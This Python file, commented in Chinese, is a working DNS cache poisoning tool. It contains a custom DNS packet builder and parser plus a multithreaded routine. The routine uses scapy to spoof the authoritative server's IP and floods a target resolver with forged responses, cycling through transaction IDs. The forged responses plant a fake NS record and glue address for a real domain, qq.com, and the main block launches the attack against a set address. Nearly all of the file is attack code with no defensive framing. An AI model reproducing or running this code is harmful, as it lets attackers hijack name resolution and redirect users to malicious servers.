# # Imports
import os
import time
import socket
import random
import threading
from scapy.all import send
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, IP

# # DNSMessage
QUERY = 0
RESPONSE = 1


class DNSMessage:
    def __init__(self, _type=QUERY):
        self.__bytes = None
        self.label_locator = dict()  # # 报文解析Cache
        self.message_type = _type  # # DNS报文类型, 0 为query 1为 response, 只有标识作用
        self.message_id = 0  # # 事务ID
        self.flags = None  # # 标志
        self.questions = None  # # 问题计数
        self.answers_rrs = None  # # 回答资源记录数
        self.authority_rrs = None  # # 权威名称服务器计数
        self.additional_rrs = None  # # 附加资源记录数
        self.queries = []  # # 查询问题区域
        self.answers = []  # # 回答问题区域
        self.authoritative_nameservers = []  # # 权威名称服务器区域
        self.additional_records = []  # # 附加区域信息
        self.other_info = None  # # 保存除了message_id外的其他信息

    def to_bytes(self, _use_other_info=False):
        """
            将类成员写成字节码传输
        :return:
        """
        if _use_other_info and self.other_info is not None:
            return int(self.message_id).to_bytes(2, "big") + self.other_info

        _message_id_bytes = int(self.message_id).to_bytes(2, "big")
        _res = b''
        _res += int(self.flags).to_bytes(2, "big")
        _res += int(self.questions).to_bytes(2, "big")
        _res += int(self.answers_rrs).to_bytes(2, "big")
        _res += int(self.authority_rrs).to_bytes(2, "big")
        _res += int(self.additional_rrs).to_bytes(2, "big")

        for _query in self.queries:
            for label in _query['labels']:
                _res += int(len(label)).to_bytes(1, "big")
                _res += label.encode()
            _res += int(0).to_bytes(1, "big")
            _res += int(_query['type']).to_bytes(2, "big") + \
                int(_query['class']).to_bytes(2, "big")
        _res += self.to_bytes_from_rrs(self.answers)
        _res += self.to_bytes_from_rrs(self.authoritative_nameservers)
        _res += self.to_bytes_from_rrs(self.additional_records)
        self.other_info = _res
        return _message_id_bytes + _res

    @staticmethod
    def to_bytes_from_rrs(_list):
        _part = b''
        for _resource_record in _list:
            for label in _resource_record['name'].split("."):
                _part += int(len(label)).to_bytes(1, "big")
                _part += label.encode()
            _part += int(0).to_bytes(1, "big")
            _part += int(_resource_record['type']).to_bytes(2, "big")
            _part += int(_resource_record['class']).to_bytes(2, "big")
            _part += int(_resource_record['ttl']).to_bytes(4, "big")
            if _resource_record['type'] == 5:
                _part += int(len(_resource_record['address']
                                 ) + 2).to_bytes(2, "big")
                for label in _resource_record['address'].split("."):
                    _part += int(len(label)).to_bytes(1, "big")
                    _part += label.encode()
                _part += int(0).to_bytes(1, "big")
            elif _resource_record['type'] == 1:
                _part += int(4).to_bytes(2, "big")
                for _p in _resource_record['address'].split("."):
                    _part += int(_p).to_bytes(1, "big")
            elif _resource_record['type'] == 28:
                _part += int(16).to_bytes(2, "big")
                for _p in _resource_record['address'].split(':'):
                    _part += int(_p, 16).to_bytes(2, 'big')
            elif _resource_record['type'] == 2:
                _part += int(len(_resource_record['address']
                                 ) + 2).to_bytes(2, "big")
                for label in _resource_record['address'].split("."):
                    _part += int(len(label)).to_bytes(1, "big")
                    _part += label.encode()
                _part += int(0).to_bytes(1, "big")
        return _part

    def clear(self, ):
        self.answers.clear()
        self.queries.clear()
        self.authoritative_nameservers.clear()
        self.additional_records.clear()
        self.set_numbers(0, 0, 0, 0, 0, None)

    def parse(self, _bytes: bytes):
        """
            写入类成员里
        :param _bytes:
        :return:
        """
        if _bytes is None:
            return False
        else:
            self.__bytes = _bytes
            # 头部
            self.message_id = int.from_bytes(_bytes[0:2], 'big')
            self.flags = int.from_bytes(_bytes[2:4], 'big')
            self.questions = int.from_bytes(_bytes[4:6], 'big')
            self.answers_rrs = int.from_bytes(_bytes[6:8], 'big')
            self.authority_rrs = int.from_bytes(_bytes[8:10], 'big')
            self.additional_rrs = int.from_bytes(_bytes[10:12], 'big')
            _bytes = _bytes[12:]
            for _ in range(self.questions):
                _query = {'labels': [], 'name': None,
                          "type": None, "class": None}
                while True:
                    _label_len = int.from_bytes(_bytes[0:1], 'big')
                    if _label_len > 0:
                        _bytes = _bytes[1:]
                        _query['labels'].append(_bytes[:_label_len].decode())
                        _bytes = _bytes[_label_len:]
                    else:
                        _bytes = _bytes[1:]
                        break
                _query['name'] = '.'.join(_query['labels'])
                _query['type'] = int.from_bytes(_bytes[0:2], 'big')
                _query['class'] = int.from_bytes(_bytes[2:4], 'big')
                self.queries.append(_query)
            # # 取消query的区域
            _bytes = _bytes[4:]
            for _ in range(self.answers_rrs):
                # # 找到数据再说
                _bytes, _answer = self.parse_rrs(_bytes)
                self.answers.append(_answer)
            # # 取消answers的区域
            for _ in range(self.authority_rrs):
                _bytes, _authority = self.parse_rrs(_bytes)
                self.authoritative_nameservers.append(_authority)
            for _ in range(self.additional_rrs):
                _bytes, _additional = self.parse_rrs(_bytes)
                self.additional_records.append(_additional)
            return True

    def parse_rrs(self, _bytes: bytes or None):
        _resource_record = {'labels': [], 'name': None, 'type': None, 'class': None, 'ttl': None,
                            'data_length': None,
                            'address': None}
        # # 解析labels
        while True:
            _label_len = int.from_bytes(_bytes[0:1], 'big')
            if _label_len >= 12 * 16:
                # # 说明是指针
                _pointer_locator = int.from_bytes(
                    _bytes[1:2], 'big') + _label_len - 12 * 16
                _resource_record['labels'].append(self.cache(_pointer_locator))
                _bytes = _bytes[2:]
                break
            else:
                if _label_len > 0:
                    _bytes = _bytes[1:]  # # 这个是长度量
                    _resource_record['labels'].append(
                        _bytes[:_label_len].decode())  # # 字符串
                    _bytes = _bytes[_label_len:]  # # 偏移
                else:
                    _bytes = _bytes[1:]
                    break
        # # 生成name
        _resource_record['name'] = '.'.join(_resource_record['labels'])
        # # type, class, ttl, data_length
        _resource_record['type'] = int.from_bytes(_bytes[0:2], 'big')
        _resource_record['class'] = int.from_bytes(_bytes[2:4], 'big')
        _resource_record['ttl'] = int.from_bytes(_bytes[4:8], 'big')
        _resource_record['data_length'] = int.from_bytes(_bytes[8:10], 'big')
        _bytes = _bytes[10:]
        # # 添加入记录
        _ip_address_ = []
        if _resource_record['type'] == 1:
            # # A 记录  data_length=4
            for __byte in _bytes[:_resource_record['data_length']]:
                _ip_address_.append(str(__byte))
            _resource_record['address'] = '.'.join(_ip_address_)
            _bytes = _bytes[_resource_record['data_length']:]
        elif _resource_record['type'] == 2 or _resource_record['type'] == 5:
            # # NS记录 or CNAME记录
            _labels = []
            while True:
                _label_len = int.from_bytes(_bytes[0:1], 'big')
                if _label_len >= 12 * 16:
                    # # 说明是指针
                    _pointer_locator = int.from_bytes(
                        _bytes[1:2], 'big') + _label_len - 12 * 16
                    _labels.append(self.cache(_pointer_locator))
                    _bytes = _bytes[2:]
                    break
                else:
                    if _label_len > 0:
                        _bytes = _bytes[1:]  # # 这个是长度量
                        _labels.append(_bytes[:_label_len].decode())  # # 字符串
                        _bytes = _bytes[_label_len:]  # # 偏移
                    else:
                        _bytes = _bytes[1:]
                        break
            _resource_record['address'] = '.'.join(_labels)
        elif _resource_record['type'] == 28:
            _index = 0
            while True:
                if _index + 2 > _resource_record['data_length']:
                    break
                else:
                    _tmp = hex(int.from_bytes(
                        _bytes[_index: _index + 2], 'big'))
                    _ip_address_.append(_tmp[2:])
                _index += 2
            _resource_record['address'] = ':'.join(_ip_address_)
            _bytes = _bytes[_resource_record['data_length']:]
        return _bytes, _resource_record

    def set_bytes(self, _bytes: bytes or None):
        self.__bytes = _bytes

    def cache(self, _locate: int):
        if _locate in self.label_locator:
            return self.label_locator[_locate]
        else:
            # # 去查找
            if self.__bytes is None:
                return None
            else:
                _bytes = self.__bytes[_locate:]
                _labels = []
                while True:
                    _label_len = int.from_bytes(_bytes[0:1], 'big')
                    if _label_len >= 12 * 16:
                        # # 说明是指针
                        _pointer_locator = int.from_bytes(
                            _bytes[1:2], 'big') + _label_len - 12 * 16
                        _labels.append(self.cache(_pointer_locator))
                        _bytes = _bytes[2:]
                        break
                    if _label_len > 0:
                        _bytes = _bytes[1:]
                        _labels.append(_bytes[:_label_len].decode())
                        _bytes = _bytes[_label_len:]
                    else:
                        _bytes = _bytes[1:]
                        break
                _res = '.'.join(_labels)
                self.label_locator[_locate] = _res
                return _res

    def set_numbers(self, _flags, _question_rrs, _answers_rrs, _auth_rrs, _addi_rrs, _query=None):
        self.flags = _flags
        self.questions = _question_rrs
        self.answers_rrs = _answers_rrs
        self.authority_rrs = _auth_rrs
        self.additional_rrs = _addi_rrs
        if _query is not None:
            self.queries.append(_query)

# # MainPoisonFlow


class MainPoisonFlow:
    def __init__(self, _target=None, _domain=None, _is_random=True, _port_scale=None, _is_port_need_shuffle=True, _authority_ip="199.234.32.33"):
        """
            pass
        :param _target:
        :param _domain:
        :param _is_random:
        :param _port_scale:
        """
        # # 随机时, 输入的端口号区间大小不得小于 1
        assert _target is not None and _domain is not None and _port_scale is not None, "参数输入错误(10)"
        if _is_random is True and len(_port_scale) > 1:
            print("参数输入冲突(20)")
        elif _is_random is False and len(_port_scale) != 1:
            print("参数输入冲突(20)")
        # # 不随机时, 输入的端口号区间大小不得不为 1
        # assert , "参数输入冲突(30)"
        # # 初始化 fail_flag, 该变量的值在每次线程阻塞前检测
        self.fail_flag = False
        # # 再次打乱区间
        if _is_port_need_shuffle:
            random.shuffle(_port_scale)
        # # 端口号区间
        self.port_seq = _port_scale
        self.domain = _domain
        self.target = _target
        self.labels = [str(random.randint(100000, 999999)) + "-" + str(time.time()).replace(".", "-")] + _domain.split(
            ".")
        # # message_id (TX _ID,)区间
        self.message_id_seq = list(range(0, 65536))
        self.authority_ip = _authority_ip
        random.shuffle(self.message_id_seq)

    def send_and_recv_thread(self, _query: bytes):
        _sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        _sock.sendto(_query, (self.target, 53))
        _res, _ = _sock.recvfrom(8192)
        _response = DNSMessage(RESPONSE)
        _response.parse(_res)
        _sock.close()
        self.fail_flag = True
        print("攻击失败, 响应已从缓存服务器返回")

    def poison_thread(self, _base_response: bytes):
        _pkt = IP(dst=self.target, src=self.authority_ip)/ \
                    UDP(dport=53, sport=53)
        for _p in self.port_seq:
            for _id in self.message_id_seq:
                _bytes = int(_id).to_bytes(2, "big") + _base_response[2:]
                send(
                    _pkt / DNS(_bytes)
                )
                if self.fail_flag:
                    return

    def flow(self):
        """
            1. 发送一个 query 并使其等待, 如果在返回攻击结束之前返回了, 则攻击失败
            2. 发回若干 response 由于socket必须 bind((.., 53)) 因此无阻塞的情形下 乱并发没有意义, 可用协程
            3. 可用一个队列, 将计算的部分给到其他编译型语言
            4. 还有一件事, 为啥不提前准备响应包
        :return:
        """
        # # 参数
        _dns_query_message = DNSMessage(_type=QUERY)
        _dns_response_message = DNSMessage(_type=RESPONSE)
        _dns_query_message.message_id = random.randint(0, 0xffff)
        _dns_query_message.set_numbers(_flags=0x0100, _question_rrs=1, _answers_rrs=0, _auth_rrs=0, _addi_rrs=0,
                                       _query={
                                           'labels': self.labels,
                                           'type': 1,
                                           'class': 1
                                       })
        # # 8100 -》 8400
        _dns_response_message.set_numbers(_flags=0x8400, _question_rrs=1, _answers_rrs=1, _auth_rrs=1, _addi_rrs=1,
                                          _query={
                                              'labels': self.labels,
                                              'type': 1,
                                              'class': 1
                                          })
        _dns_response_message.answers.append({
            'name': '.'.join(self.labels),
            'type': 1,
            'class': 1,
            "ttl": 24 * 60 * 60 * 2,
            "data_length": 4,
            "address": "8.8.8.8"
        })
        _dns_response_message.authoritative_nameservers.append({
            'name': self.domain,
            "type": 2,
            "class": 1,
            "ttl": 24 * 60 * 60 * 2,
            "data_length": 4,
            "address": "ns1." + self.domain
        })
        _dns_response_message.additional_records.append({
            'name': "ns1." + self.domain,
            "type": 1,
            "class": 1,
            "ttl": 24 * 60 * 60 * 2,
            "data_length": 4,
            "address": "2.2.2.2"
        })

        _query_bytes = _dns_query_message.to_bytes()
        _response_bytes = _dns_response_message.to_bytes()
        # # 线程
        # self.send_and_recv_thread(_query_bytes)
        _send_and_recv_thread = threading.Thread(
            target=self.send_and_recv_thread, args=(_query_bytes,))
        _poison_thread = threading.Thread(
            target=self.poison_thread, args=(_response_bytes,))
        # _threads = []
        # _threads = [_send_and_recv_thread]
        # _threads = [_poison_thread]
        _threads = [_send_and_recv_thread, _poison_thread]
        for _t in _threads:
            _t.start()
        for _t in _threads:
            _t.join()
        print("OK")


if __name__ == "__main__":
    mpf = MainPoisonFlow(_target="10.245.146.74", _domain="qq.com", _is_random=False, _port_scale=[25567])
    mpf.flow()
